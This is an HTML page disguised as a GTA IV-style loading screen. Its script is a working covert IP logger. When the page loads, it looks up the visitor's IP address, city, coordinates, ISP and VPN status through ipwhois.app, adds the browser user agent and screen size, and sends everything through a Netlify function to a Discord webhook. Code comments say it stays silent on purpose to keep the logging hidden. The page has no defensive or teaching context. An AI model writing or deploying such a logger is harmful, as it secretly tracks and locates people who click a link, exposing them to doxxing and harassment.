<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Loading...</title>
  <style>
    /* GTA IV loading screen style */
    html, body {
      margin: 0; padding: 0; height: 100%;
      background: black;
      color: white;
      font-family: 'Arial Black', Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      user-select: none;
      overflow: hidden;
    }
    #loading-text {
      font-size: 8rem;
      letter-spacing: 0.6em;
      animation: flickerGTA 2.5s infinite alternate;
      user-select: none;
    }
    @keyframes flickerGTA {
      0%, 100% { opacity: 1; }
      40%, 60% { opacity: 0.3; }
    }
  </style>
</head>
<body>
  <div id="loading-text">LOADING...</div>

  <script>
    const netlifyFunctionUrl = "/.netlify/functions/log-ip";

    function safeGet(obj, path, defaultValue = '') {
      return path.reduce((acc, key) => (acc && acc[key] !== undefined) ? acc[key] : defaultValue, obj);
    }

    async function fetchIPInfo() {
      const res = await fetch('https://ipwhois.app/json/');
      if (!res.ok) throw new Error('Failed to fetch IP info');
      return res.json();
    }

    async function sendDiscordWebhook(embed) {
      await fetch(netlifyFunctionUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] }),
      });
    }

    (async () => {
      try {
        const data = await fetchIPInfo();

        const embed = {
          title: "üïµÔ∏è New Visitor Logged",
          color: 0x00ffff,
          timestamp: new Date().toISOString(),
          footer: {
            text: "Get Trolled IP Logger",
            icon_url: "https://i.imgur.com/qZ7j0fV.png"
          },
          thumbnail: {
            url: data.country_flag || ""
          },
          author: {
            name: "Get Trolled IP Logger",
            url: "https://discord.com",
            icon_url: "https://i.imgur.com/qZ7j0fV.png"
          },
          fields: [
            { name: "IPv4 Address", value: `\`${data.ip}\``, inline: true },
            { name: "IPv6 Address", value: data.ipv6 ? `\`${data.ipv6}\`` : "N/A", inline: true },
            { name: "Hostname", value: data.hostname || "N/A", inline: true },
            { name: "Country", value: `${data.country} (${data.country_code})`, inline: true },
            { name: "Region", value: data.region || "N/A", inline: true },
            { name: "City", value: data.city || "N/A", inline: true },
            { name: "Zip", value: data.postal || "N/A", inline: true },
            { name: "Latitude", value: data.latitude || "N/A", inline: true },
            { name: "Longitude", value: data.longitude || "N/A", inline: true },
            { name: "ISP", value: data.isp || "N/A", inline: false },
            { name: "Organization", value: data.org || "N/A", inline: false },
            { name: "ASN", value: data.asn || "N/A", inline: true },
            { name: "Timezone", value: `${data.timezone_gmt} (${data.timezone})`, inline: true },
            { name: "Currency", value: `${safeGet(data, ['currency', 'code'], 'N/A')} (${safeGet(data, ['currency', 'name'], '')})`, inline: true },
            { name: "VPN/Proxy", value: safeGet(data, ['security', 'is_proxy'], false) ? "Yes" : "No", inline: true },
            { name: "VPN/Hosting", value: safeGet(data, ['security', 'is_hosting'], false) ? "Yes" : "No", inline: true },
            { name: "Mobile", value: safeGet(data, ['security', 'is_mobile'], false) ? "Yes" : "No", inline: true },
            { name: "Bot", value: safeGet(data, ['security', 'is_bot'], false) ? "Yes" : "No", inline: true },
            { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
            { name: "Screen Resolution", value: `\`${window.screen.width}√ó${window.screen.height} (${window.devicePixelRatio} DPR)\``, inline: true },
          ]
        };

        await sendDiscordWebhook(embed);

        // No visible logs or success messages for stealth

      } catch (err) {
        // Fail silently, no visible errors
        console.error("Logging failed:", err);
      }
    })();
  </script>
</body>
</html>
